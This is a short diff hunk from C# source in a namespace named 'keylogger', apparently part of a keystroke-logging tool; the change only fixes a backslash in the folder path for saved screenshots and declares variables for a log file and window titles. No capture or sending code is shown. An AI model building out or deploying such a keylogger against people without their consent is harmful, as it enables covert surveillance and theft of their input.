@@ -17,7 +17,7 @@ namespace keylogger
 
         #region variable
         public static DateTime datum = DateTime.Now;
-        public static string pathString = Properties.Settings.Default.keyloggerlocatie + "keylogger\\screenshot\\";
+        public static string pathString = Properties.Settings.Default.keyloggerlocatie + "\\keylogger\\screenshot\\";
         public static string path = (pathString + "/" + datum.ToShortDateString() + ".text");
         public static String hWndTitle;
         public static String hWndTitlePast;
